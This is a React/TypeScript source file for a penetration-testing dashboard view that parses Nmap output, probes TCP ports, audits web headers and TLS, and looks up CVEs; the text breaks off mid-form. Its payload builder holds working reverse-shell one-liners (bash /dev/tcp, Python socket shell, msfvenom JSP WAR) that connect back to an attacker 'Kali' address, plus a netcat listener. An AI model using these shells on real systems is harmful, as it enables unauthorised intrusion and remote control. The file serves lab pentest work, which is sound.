import React, { useMemo, useState } from 'react';
import {
  Activity,
  Check,
  Copy,
  Database,
  ExternalLink,
  FileUp,
  Globe,
  Network,
  Radio,
  Save,
  Search,
  ShieldAlert,
  Trash2,
} from 'lucide-react';
import {
  CorrelatedFindingItem,
  LabConfig,
  ParsedPortItem,
  SavedScanRecord,
} from '../types/vapt';

interface LiveAnalyzerViewProps {
  config: LabConfig;
  isSignedIn: boolean;
  savedScans: SavedScanRecord[];
  onSaveScan: (scan: {
    targetIp: string;
    osGuess: string;
    openPorts: ParsedPortItem[];
    findings: CorrelatedFindingItem[];
  }) => Promise<void>;
  onDeleteScan: (scanId: string) => Promise<void>;
  onSendScanToReport: (rawSummary: string, targetIp: string) => void;
}

interface ParsedApiResult {
  format: 'xml' | 'text';
  targetIp: string;
  osGuess: string;
  openPorts: ParsedPortItem[];
  findings: CorrelatedFindingItem[];
}

interface UrlInspectionResult {
  url: string;
  hostname: string;
  responseTimeMs: number;
  securityScore: number;
  dnsRecords: string[];
  mxRecords: string[];
  nsRecords: string[];
  spfRecord: string | null;
  dmarcRecord: string | null;
  statusCode: number;
  statusMessage: string;
  serverBanner: string;
  poweredBy: string;
  corsIssue: string;
  cookieIssues: Array<{
    name: string;
    missingFlags: string[];
    ok: boolean;
  }>;
  pathChecks: Array<{
    path: string;
    statusCode: number;
    note: string;
  }>;
  securityHeadersChecklist: Array<{
    header: string;
    present: boolean;
    value: string;
  }>;
  tlsSummary: {
    protocol: string;
    subject: string;
    issuer: string;
    validTo: string;
    daysRemaining: number | null;
  } | null;
}

interface LiveProbeResult {
  host: string;
  resolvedIp: string;
  probedAt: string;
  results: Array<{
    port: number;
    status: 'open' | 'closed' | 'filtered';
    latencyMs: number;
    service: string;
    banner: string;
  }>;
}

interface LiveCveItem {
  id: string;
  published: string;
  severity: string;
  cvssScore: number | null;
  description: string;
  referenceUrl: string;
}

function expandCidrHosts(cidrInput: string): { hosts: string[]; error: string | null } {
  const trimmed = cidrInput.trim();
  const match = trimmed.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\/(\d{1,2})$/);
  if (!match) {
    return { hosts: [], error: 'Enter a valid IPv4 CIDR (e.g., 192.168.56.0/28).' };
  }
  const octets = match.slice(1, 5).map(Number);
  const prefix = Number(match[5]);
  if (octets.some((o) => o > 255) || prefix < 24 || prefix > 32) {
    return {
      hosts: [],
      error: 'For fast browser inspection, use an IPv4 prefix between /24 and /32.',
    };
  }
  const ipNum =
    ((octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]) >>> 0;
  const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
  const network = (ipNum & mask) >>> 0;
  const broadcast = (network | (~mask >>> 0)) >>> 0;

  const hosts: string[] = [];
  const start = prefix >= 31 ? network : network + 1;
  const end = prefix >= 31 ? broadcast : broadcast - 1;
  for (let addr = start; addr <= end && hosts.length < 256; addr++) {
    hosts.push(
      `${(addr >>> 24) & 255}.${(addr >>> 16) & 255}.${(addr >>> 8) & 255}.${addr & 255}`
    );
  }
  return { hosts, error: null };
}

export const LiveAnalyzerView: React.FC<LiveAnalyzerViewProps> = ({
  config,
  isSignedIn,
  savedScans,
  onSaveScan,
  onDeleteScan,
  onSendScanToReport,
}) => {
  const [toolTab, setToolTab] = useState<'nmap' | 'probe' | 'web' | 'cve' | 'cidr'>('nmap');

  // Nmap XML / Text Analyzer State
  const [rawScanInput, setRawScanInput] = useState<string>('');
  const [parsedResult, setParsedResult] = useState<ParsedApiResult | null>(null);
  const [nmapError, setNmapError] = useState<string | null>(null);
  const [nmapLoading, setNmapLoading] = useState(false);
  const [scanSavedNotice, setScanSavedNotice] = useState<string | null>(null);

  // Live TCP Port & Banner Probe State
  const [probeHost, setProbeHost] = useState('scanme.nmap.org');
  const [probePorts, setProbePorts] = useState('21,22,80,443,8080');
  const [probeResult, setProbeResult] = useState<LiveProbeResult | null>(null);
  const [probeError, setProbeError] = useState<string | null>(null);
  const [probeLoading, setProbeLoading] = useState(false);
  const [probeSavedNotice, setProbeSavedNotice] = useState<string | null>(null);

  // Web Security Header / TLS / DNS Inspector State
  const [inspectUrlInput, setInspectUrlInput] = useState('https://example.com');
  const [urlResult, setUrlResult] = useState<UrlInspectionResult | null>(null);
  const [urlError, setUrlError] = useState<string | null>(null);
  const [urlLoading, setUrlLoading] = useState(false);

  // Live NVD CVE Intelligence State
  const [cveQuery, setCveQuery] = useState('vsftpd 2.3.4');
  const [cveResults, setCveResults] = useState<LiveCveItem[]>([]);
  const [cveLastQuery, setCveLastQuery] = useState<string | null>(null);
  const [cveError, setCveError] = useState<string | null>(null);
  const [cveLoading, setCveLoading] = useState(false);

  // CIDR & Payload Builder State
  const [cidrInput, setCidrInput] = useState('192.168.56.96/28');
  const [lportInput, setLportInput] = useState('4444');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const targetIp = config.targetIp || '192.168.56.101';
  const kaliIp = config.kaliIp || '192.168.56.102';

  const loadSampleXml = () => {
    setRawScanInput(`<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <address addr="${targetIp}" addrtype="ipv4"/>
    <os>
      <osmatch name="Linux 2.6.9 - 2.6.33" accuracy="100"/>
    </os>
    <ports>
      <port protocol="tcp" portid="21"><state state="open"/><service name="ftp" product="vsftpd" version="2.3.4"/></port>
      <port protocol="tcp" portid="22"><state state="open"/><service name="ssh" product="OpenSSH" version="4.7p1 Debian 8ubuntu1"/></port>
      <port protocol="tcp" portid="23"><state state="open"/><service name="telnet" product="Linux telnetd"/></port>
      <port protocol="tcp" portid="80"><state state="open"/><service name="http" product="Apache httpd" version="2.2.8"/></port>
      <port protocol="tcp" portid="139"><state state="open"/><service name="netbios-ssn" product="Samba smbd" version="3.X - 4.X"/></port>
      <port protocol="tcp" portid="445"><state state="open"/><service name="netbios-ssn" product="Samba smbd" version="3.0.20-Debian"/></port>
      <port protocol="tcp" portid="1524"><state state="open"/><service name="ingreslock" product="Metasploitable root shell"/></port>
      <port protocol="tcp" portid="3306"><state state="open"/><service name="mysql" product="MySQL" version="5.0.51a-3ubuntu5"/></port>
      <port protocol="tcp" portid="3632"><state state="open"/><service name="distccd" product="distccd" version="v1"/></port>
      <port protocol="tcp" portid="5432"><state state="open"/><service name="postgresql" product="PostgreSQL DB" version="8.3.0 - 8.3.7"/></port>
      <port protocol="tcp" portid="6667"><state state="open"/><service name="irc" product="UnrealIRCd"/></port>
      <port protocol="tcp" portid="8180"><state state="open"/><service name="http" product="Apache Tomcat/Coyote JSP engine" version="1.1"/></port>
    </ports>
  </host>
</nmaprun>`);
  };

  const handleUploadFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const text = await file.text();
    setRawScanInput(text);
  };

  const handleAnalyzeNmap = async () => {
    setNmapError(null);
    setScanSavedNotice(null);
    if (!rawScanInput.trim()) {
      setNmapError('Paste or upload Nmap XML / scan output first.');
      return;
    }
    setNmapLoading(true);
    try {
      const resp = await fetch('/api/parse-nmap', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ raw: rawScanInput }),
      });
      const data = await resp.json();
      if (!resp.ok) {
        throw new Error(data.error || 'Failed to parse Nmap output.');
      }
      setParsedResult(data as ParsedApiResult);
    } catch (err: unknown) {
      setNmapError(err instanceof Error ? err.message : 'Unable to analyze scan output.');
    } finally {
      setNmapLoading(false);
    }
  };

  const handleSaveCurrentScan = async () => {
    if (!parsedResult || !isSignedIn) return;
    setScanSavedNotice(null);
    try {
      await onSaveScan({
        targetIp: parsedResult.targetIp,
        osGuess: parsedResult.osGuess,
        openPorts: parsedResult.openPorts,
        findings: parsedResult.findings,
      });
      setScanSavedNotice('Scan record saved to your account.');
    } catch {
      setNmapError('Failed to save scan record.');
    }
  };

  const handlePushToReport = () => {
    if (!parsedResult) return;
    const lines = [
      `Target IP: ${parsedResult.targetIp} | OS: ${parsedResult.osGuess}`,
      `Open Ports (${parsedResult.openPorts.length}):`,
      ...parsedResult.openPorts.map(
        (p) => `${String(p.port + '/' + p.protocol).padEnd(10)} open  ${p.service.padEnd(14)} ${p.banner}`
      ),
    ];
    onSendScanToReport(lines.join('\n'), parsedResult.targetIp);
  };

  const handleRunLiveProbe = async (e: React.FormEvent) => {
    e.preventDefault();
    setProbeError(null);
    setProbeSavedNotice(null);
    if (!probeHost.trim()) {
      setProbeError('Enter a target hostname or public IPv4 address.');
      return;
    }
    setProbeLoading(true);
    try {
      const resp = await fetch('/api/probe-port', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host: probeHost, ports: probePorts }),
      });
      const data = await resp.json();
      if (!resp.ok) {
        throw new Error(data.error || 'Live port probe failed.');
      }
      setProbeResult(data as LiveProbeResult);
    } catch (err: unknown) {
      setProbeError(err instanceof Error ? err.message : 'Live port probe failed.');
    } finally {
      setProbeLoading(false);
    }
  };

  const handleSaveLiveProbe = async () => {
    if (!probeResult || !isSignedIn) return;
    setProbeSavedNotice(null);
    const openPorts: ParsedPortItem[] = probeResult.results
      .filter((r) => r.status === 'open')
      .map((r) => ({
        port: r.port,
        protocol: 'tcp',
        service: r.service,
        banner: r.banner,
        nseNotes: [`Latency: ${r.latencyMs}ms`],
      }));
    try {
      await onSaveScan({
        targetIp: `${probeResult.host} (${probeResult.resolvedIp})`,
        osGuess: 'Live TCP Banner Probe',
        openPorts,
        findings: [],
      });
      setProbeSavedNotice('Live probe saved to Scan History.');
    } catch {
      setProbeError('Failed to save live probe.');
    }
  };

  const handlePushProbeToReport = () => {
    if (!probeResult) return;
    const lines = [
      `# Live TCP Port & Banner Probe — ${probeResult.host} (${probeResult.resolvedIp})`,
      `# Timestamp: ${probeResult.probedAt}`,
      `PORT      STATE     SERVICE         RTT    BANNER`,
      ...probeResult.results.map(
        (r) =>
          `${String(r.port + '/tcp').padEnd(10)}${r.status.padEnd(10)}${r.service.padEnd(16)}${String(r.latencyMs + 'ms').padEnd(7)}${r.banner}`
      ),
    ];
    onSendScanToReport(lines.join('\n'), probeResult.resolvedIp);
  };

  const handleInspectUrl = async (e: React.FormEvent) => {
    e.preventDefault();
    setUrlError(null);
    setUrlLoading(true);
    try {
      const resp = await fetch('/api/inspect-url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: inspectUrlInput }),
      });
      const data = await resp.json();
      if (!resp.ok) {
        throw new Error(data.error || 'Inspection failed.');
      }
      setUrlResult(data as UrlInspectionResult);
    } catch (err: unknown) {
      setUrlError(err instanceof Error ? err.message : 'Target inspection failed.');
    } finally {
      setUrlLoading(false);
    }
  };

  const handlePushWebAuditToReport = () => {
    if (!urlResult) return;
    const missingHeaders = urlResult.securityHeadersChecklist
      .filter((h) => !h.present)
      .map((h) => h.header);
    const lines = [
      `# Live Web, DNS & TLS Security Audit — ${urlResult.url}`,
      `HTTP Status: ${urlResult.statusCode} ${urlResult.statusMessage} (${urlResult.responseTimeMs} ms)`,
      `Security Score: ${urlResult.securityScore}/100 | Server: ${urlResult.serverBanner}`,
      `DNS A/AAAA: ${urlResult.dnsRecords.join(', ') || 'Direct IP'}`,
      `MX Records: ${urlResult.mxRecords.join(', ') || 'None'}`,
      `SPF: ${urlResult.spfRecord || 'Missing'} | DMARC: ${urlResult.dmarcRecord || 'Missing'}`,
      urlResult.tlsSummary
        ? `TLS: ${urlResult.tlsSummary.protocol} | Issuer: ${urlResult.tlsSummary.issuer} | Valid To: ${urlResult.tlsSummary.validTo}`
        : 'TLS: Not HTTPS',
      `CORS Probe: ${urlResult.corsIssue}`,
      `Missing Security Headers (${missingHeaders.length}): ${missingHeaders.join(', ') || 'None'}`,
      `Discovery Paths:`,
      ...urlResult.pathChecks.map((p) => `  ${p.path.padEnd(28)} -> HTTP ${p.statusCode} (${p.note})`),
    ];
    onSendScanToReport(lines.join('\n'), urlResult.hostname);
  };

  const runCveSearch = async (queryText: string) => {
    const trimmed = queryText.trim();
    if (trimmed.length < 2) {
      setCveError('Enter at least 2 characters (e.g., vsftpd 2.3.4 or OpenSSH 4.7).');
      return;
    }
    setCveError(null);
    setCveLoading(true);
    setCveQuery(trimmed);
    setToolTab('cve');
    try {
      const resp = await fetch(`/api/cve-search?q=${encodeURIComponent(trimmed)}`);
      const data = await resp.json();
      if (!resp.ok) {
        throw new Error(data.error || 'Live NVD query failed.');
      }
      setCveResults((data.items || []) as LiveCveItem[]);
      setCveLastQuery(trimmed);
    } catch (err: unknown) {
      setCveError(err instanceof Error ? err.message : 'Live NVD CVE lookup failed.');
    } finally {
      setCveLoading(false);
    }
  };

  const cidrExpanded = useMemo(() => expandCidrHosts(cidrInput), [cidrInput]);

  const payloads = useMemo(() => {
    const portNum = Number.parseInt(lportInput, 10) || 4444;
    return [
      {
        id: 'listener',
        label: 'Netcat Listener (Kali)',
        code: `nc -lvnp ${portNum}`,
      },
      {
        id: 'bash',
        label: 'Bash TCP Reverse Shell',
        code: `bash -i >& /dev/tcp/${kaliIp}/${portNum} 0>&1`,
      },
      {
        id: 'python',
        label: 'Python 3 Socket Shell',
        code: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${kaliIp}",${portNum}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      },
      {
        id: 'war',
        label: 'Tomcat WAR Payload (msfvenom)',
        code: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${kaliIp} LPORT=${portNum} -f war > lab_shell.war`,
      },
    ];
  }, [kaliIp, lportInput]);

  const handleCopy = async (text: string, id: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 1600);
    } catch {
      // Ignore clipboard failures
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-5 border-b border-slate-200 dark:border-[#1D2C35]">
        <div className="space-y-1">
          <p className="text-xs font-medium text-teal-700 dark:text-[#2DD4BF]">
            {config.toolName || 'AutoReconVAPT'} Real-Time Security Engine
          </p>
          <h1 className="text-2xl font-bold tracking-tight text-slate-900 dark:text-[#F0F6FA]">
            Live VAPT Analyzer &amp; Network Probe
          </h1>
          <p className="text-sm text-slate-600 dark:text-slate-300 max-w-2xl">
            Run live TCP port &amp; banner probes, real-time DNS/TLS/CORS/header audits, NIST NVD CVE
            intelligence lookups, and Nmap XML correlation—and push live results into your VAPT PDF report.
          </p>
        </div>
      </div>

      {/* Mode Switcher */}
      <div className="inline-flex flex-wrap items-center gap-1 p-1 bg-slate-200/70 dark:bg-[#131D23] dark:border dark:border-[#1D2C35] rounded-lg">
        <button
          type="button"
          onClick={() => setToolTab('nmap')}
          className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md whitespace-nowrap shrink-0 cursor-pointer ${
            toolTab === 'nmap'
              ? 'bg-white text-slate-900 shadow-sm dark:bg-[#0D1418] dark:text-[#2DD4BF] dark:border dark:border-[#2DD4BF]/35'
              : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
          }`}
        >
          <Activity className="w-3.5 h-3.5" />
          <span>Nmap XML &amp; CVE Analyzer</span>
        </button>
        <button
          type="button"
          onClick={() => setToolTab('probe')}
          className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md whitespace-nowrap shrink-0 cursor-pointer ${
            toolTab === 'probe'
              ? 'bg-white text-slate-900 shadow-sm dark:bg-[#0D1418] dark:text-[#2DD4BF] dark:border dark:border-[#2DD4BF]/35'
              : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
          }`}
        >
          <Radio className="w-3.5 h-3.5" />
          <span>Live TCP Port &amp; Banner Probe</span>
        </button>
        <button
          type="button"
          onClick={() => setToolTab('web')}
          className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md whitespace-nowrap shrink-0 cursor-pointer ${
            toolTab === 'web'
              ? 'bg-white text-slate-900 shadow-sm dark:bg-[#0D1418] dark:text-[#2DD4BF] dark:border dark:border-[#2DD4BF]/35'
              : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
          }`}
        >
          <Globe className="w-3.5 h-3.5" />
          <span>Live Web, DNS, TLS &amp; CORS Audit</span>
        </button>
        <button
          type="button"
          onClick={() => setToolTab('cve')}
          className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md whitespace-nowrap shrink-0 cursor-pointer ${
            toolTab === 'cve'
              ? 'bg-white text-slate-900 shadow-sm dark:bg-[#0D1418] dark:text-[#2DD4BF] dark:border dark:border-[#2DD4BF]/35'
              : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
          }`}
        >
          <Database className="w-3.5 h-3.5" />
          <span>Live NVD CVE Search</span>
        </button>
        <button
          type="button"
          onClick={() => setToolTab('cidr')}
          className={`inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md whitespace-nowrap shrink-0 cursor-pointer ${
            toolTab === 'cidr'
              ? 'bg-white text-slate-900 shadow-sm dark:bg-[#0D1418] dark:text-[#2DD4BF] dark:border dark:border-[#2DD4BF]/35'
              : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-100'
          }`}
        >
          <Network className="w-3.5 h-3.5" />
          <span>CIDR &amp; Payloads</span>
        </button>
      </div>

      {/* TAB 1: Nmap XML & Text Analyzer */}
      {toolTab === 'nmap' && (
        <div className="grid grid-cols-1 xl:grid-cols-12 gap-6 items-start">
          <div className="xl:col-span-7 space-y-5">
            <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-5 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div>
                  <h2 className="text-sm font-semibold text-slate-900 dark:text-[#F0F6FA]">
                    Upload or Paste Nmap XML / Scan Output
                  </h2>
                  <p className="text-xs text-slate-500 dark:text-slate-400">
                    Supports <code className="font-mono text-teal-700 dark:text-[#2DD4BF]">nmap -oX scan.xml</code> or standard terminal output.
                  </p>
                </div>

                <div className="flex flex-wrap items-center gap-2">
                  <button
                    type="button"
                    onClick={loadSampleXml}
                    className="px-3 py-1.5 text-xs font-medium text-slate-700 dark:text-slate-200 bg-slate-100 dark:bg-[#131D23] dark:border dark:border-[#273B47] hover:bg-slate-200 dark:hover:bg-[#19262E] dark:hover:border-[#2DD4BF]/50 dark:hover:text-white rounded-lg whitespace-nowrap cursor-pointer"
                  >
                    Load Lab Sample XML
                  </button>
                  <label className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 dark:text-slate-200 bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] hover:bg-slate-50 hover:border-teal-500/40 dark:hover:bg-[#19262E] dark:hover:border-[#2DD4BF]/50 dark:hover:text-white rounded-lg cursor-pointer">
                    <FileUp className="w-3.5 h-3.5" />
                    <span>Upload File</span>
                    <input
                      type="file"
                      accept=".xml,.txt,.nmap"
                      onChange={handleUploadFile}
                      className="hidden"
                    />
                  </label>
                </div>
              </div>

              <textarea
                rows={8}
                value={rawScanInput}
                onChange={(e) => setRawScanInput(e.target.value)}
                placeholder="Paste your Nmap XML (<nmaprun>...) or terminal output here..."
                className="w-full px-3 py-2 text-xs font-mono bg-slate-50 dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
              />

              {nmapError && (
                <p className="text-xs font-medium text-red-700 dark:text-rose-300 bg-red-50 dark:bg-rose-500/12 border border-red-200 dark:border-rose-500/30 rounded-lg px-3 py-2">
                  {nmapError}
                </p>
              )}

              {scanSavedNotice && (
                <p className="text-xs font-medium text-emerald-800 dark:text-emerald-300 bg-emerald-50 dark:bg-emerald-500/12 border border-emerald-200 dark:border-emerald-500/30 rounded-lg px-3 py-2">
                  {scanSavedNotice}
                </p>
              )}

              <div className="flex flex-wrap items-center gap-3">
                <button
                  type="button"
                  onClick={handleAnalyzeNmap}
                  disabled={nmapLoading}
                  className="inline-flex items-center gap-2 px-4 py-2 text-xs font-semibold text-white bg-teal-700 hover:bg-teal-600 hover:shadow-[0_6px_18px_-4px_rgba(13,148,136,0.42)] dark:bg-[#14B8A6] dark:text-[#042F2E] dark:hover:bg-[#2DD4BF] dark:hover:shadow-[0_6px_22px_-4px_rgba(45,212,191,0.42)] disabled:opacity-60 rounded-lg cursor-pointer"
                >
                  <Search className="w-3.5 h-3.5" />
                  <span>{nmapLoading ? 'Analyzing...' : 'Analyze & Correlate CVEs'}</span>
                </button>

                {parsedResult && (
                  <>
                    <button
                      type="button"
                      onClick={handlePushToReport}
                      className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-slate-700 dark:text-slate-200 bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] hover:bg-slate-50 hover:border-teal-500/40 dark:hover:bg-[#19262E] dark:hover:border-[#2DD4BF]/50 dark:hover:text-white rounded-lg cursor-pointer"
                    >
                      <span>Send to VAPT Report</span>
                    </button>

                    {isSignedIn && (
                      <button
                        type="button"
                        onClick={handleSaveCurrentScan}
                        className="inline-flex items-center gap-1.5 px-3.5 py-2 text-xs font-medium text-teal-800 dark:text-[#2DD4BF] bg-teal-50 dark:bg-[#14B8A6]/15 border border-teal-200 dark:border-[#2DD4BF]/35 hover:bg-teal-100 dark:hover:bg-[#14B8A6]/25 rounded-lg cursor-pointer"
                      >
                        <Save className="w-3.5 h-3.5" />
                        <span>Save Scan to Cloud</span>
                      </button>
                    )}
                  </>
                )}
              </div>
            </div>

            {parsedResult && (
              <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-5 space-y-5">
                <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-slate-100 dark:border-[#1D2C35]">
                  <div>
                    <h3 className="text-sm font-semibold text-slate-900 dark:text-[#F0F6FA]">
                      Parsed Analysis — {parsedResult.targetIp}
                    </h3>
                    <p className="text-xs text-slate-500 dark:text-slate-400">
                      Format: {parsedResult.format.toUpperCase()} · OS: {parsedResult.osGuess} ·{' '}
                      {parsedResult.openPorts.length} open ports · {parsedResult.findings.length}{' '}
                      matched vulnerabilities
                    </p>
                  </div>
                </div>

                {parsedResult.findings.length > 0 && (
                  <div className="space-y-2">
                    <h4 className="text-xs font-semibold text-slate-700 dark:text-slate-200 flex items-center gap-1.5">
                      <ShieldAlert className="w-3.5 h-3.5 text-red-700 dark:text-rose-400" />
                      <span>Correlated Vulnerabilities</span>
                    </h4>
                    <div className="overflow-x-auto">
                      <table className="w-full text-xs border border-slate-200 dark:border-[#1D2C35]">
                        <thead className="bg-slate-50 dark:bg-[#131D23] text-slate-700 dark:text-slate-300">
                          <tr>
                            <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Severity</th>
                            <th className="text-right px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">CVSS</th>
                            <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Port</th>
                            <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Finding</th>
                            <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Ref</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-100 dark:divide-[#1D2C35]">
                          {parsedResult.findings.map((f, i) => (
                            <tr key={`${f.port}-${i}`}>
                              <td
                                className={`px-3 py-2 font-semibold ${
                                  f.severity === 'Critical'
                                    ? 'text-red-700 dark:text-rose-400'
                                    : 'text-amber-700 dark:text-amber-400'
                                }`}
                              >
                                {f.severity}
                              </td>
                              <td className="px-3 py-2 text-right font-mono tabular-nums dark:text-slate-300">
                                {f.cvss.toFixed(1)}
                              </td>
                              <td className="px-3 py-2 font-mono dark:text-slate-300">
                                {f.port}/{f.protocol}
                              </td>
                              <td className="px-3 py-2 font-medium text-slate-900 dark:text-[#F0F6FA]">{f.title}</td>
                              <td className="px-3 py-2 font-mono dark:text-slate-300">{f.cve}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}

                <div className="space-y-2">
                  <h4 className="text-xs font-semibold text-slate-700 dark:text-slate-200">Open Ports Discovered</h4>
                  <div className="overflow-x-auto">
                    <table className="w-full text-xs border border-slate-200 dark:border-[#1D2C35]">
                      <thead className="bg-slate-50 dark:bg-[#131D23] text-slate-700 dark:text-slate-300">
                        <tr>
                          <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Port</th>
                          <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Service</th>
                          <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Banner</th>
                          <th className="text-right px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Live NVD</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100 dark:divide-[#1D2C35]">
                        {parsedResult.openPorts.map((p) => (
                          <tr key={`${p.port}-${p.protocol}`}>
                            <td className="px-3 py-2 font-mono tabular-nums dark:text-[#2DD4BF]">
                              {p.port}/{p.protocol}
                            </td>
                            <td className="px-3 py-2 font-mono dark:text-slate-300">{p.service}</td>
                            <td className="px-3 py-2 text-slate-700 dark:text-slate-300">{p.banner}</td>
                            <td className="px-3 py-2 text-right">
                              <button
                                type="button"
                                onClick={() => void runCveSearch(p.banner || p.service)}
                                className="inline-flex items-center gap-1 px-2 py-1 text-[11px] font-medium text-teal-800 dark:text-[#2DD4BF] bg-teal-50 dark:bg-[#14B8A6]/15 hover:bg-teal-100 dark:hover:bg-[#14B8A6]/25 border border-transparent dark:border-[#2DD4BF]/30 rounded cursor-pointer"
                              >
                                <Database className="w-3 h-3" />
                                <span>Live CVEs</span>
                              </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Saved Cloud Scans Column */}
          <aside className="xl:col-span-5 bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-5 space-y-4">
            <div className="border-b border-slate-100 dark:border-[#1D2C35] pb-3">
              <h2 className="text-sm font-semibold text-slate-900 dark:text-[#F0F6FA]">Saved Scan History</h2>
              <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                {isSignedIn
                  ? 'Click any saved scan to reload its open ports and CVE findings.'
                  : 'Sign in with Google from the sidebar to store parsed Nmap scans and live probes in your account.'}
              </p>
            </div>

            {savedScans.length === 0 ? (
              <p className="text-xs text-slate-500 dark:text-slate-400 py-4">
                No saved scans yet. Analyze an Nmap XML file or run a Live TCP Probe and save it.
              </p>
            ) : (
              <div className="divide-y divide-slate-100 dark:divide-[#1D2C35] border border-slate-200 dark:border-[#1D2C35] rounded-lg overflow-hidden">
                {savedScans.map((scan) => (
                  <div
                    key={scan.id}
                    className="flex items-center justify-between gap-2 px-3.5 py-3 hover:bg-slate-50 dark:hover:bg-[#131D23]"
                  >
                    <button
                      type="button"
                      onClick={() =>
                        setParsedResult({
                          format: 'xml',
                          targetIp: scan.targetIp,
                          osGuess: scan.osGuess,
                          openPorts: scan.openPorts,
                          findings: scan.findings,
                        })
                      }
                      className="flex-1 text-left min-w-0 cursor-pointer"
                    >
                      <div className="text-xs font-mono font-semibold text-slate-900 dark:text-[#F0F6FA] truncate">
                        {scan.targetIp}
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 tabular-nums mt-0.5">
                        {scan.openPortCount} ports · {scan.findingCount} findings ·{' '}
                        {scan.createdAtLabel}
                      </div>
                    </button>
                    <button
                      type="button"
                      onClick={() => onDeleteScan(scan.id)}
                      className="p-1.5 text-slate-400 hover:text-red-600 dark:hover:text-rose-400 rounded cursor-pointer"
                      aria-label="Delete scan"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                ))}
              </div>
            )}
          </aside>
        </div>
      )}

      {/* TAB 2: Live TCP Port & Banner Probe */}
      {toolTab === 'probe' && (
        <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-6 space-y-6">
          <div className="space-y-1">
            <h2 className="text-base font-semibold text-slate-900 dark:text-[#F0F6FA]">
              Live TCP Port Reachability &amp; Service Banner Probe
            </h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">
              Executes real TCP socket connections from the backend to measure open/closed/filtered state,
              round-trip latency, and raw service banners (up to 15 ports per run).
            </p>
          </div>

          <form onSubmit={handleRunLiveProbe} className="grid grid-cols-1 sm:grid-cols-12 gap-3 items-end">
            <label className="sm:col-span-5 block space-y-1">
              <span className="text-xs font-medium text-slate-700 dark:text-slate-300">Target Hostname / Public IP</span>
              <input
                type="text"
                value={probeHost}
                onChange={(e) => setProbeHost(e.target.value)}
                placeholder="scanme.nmap.org"
                className="w-full px-3.5 py-2 text-sm font-mono bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
              />
            </label>

            <label className="sm:col-span-4 block space-y-1">
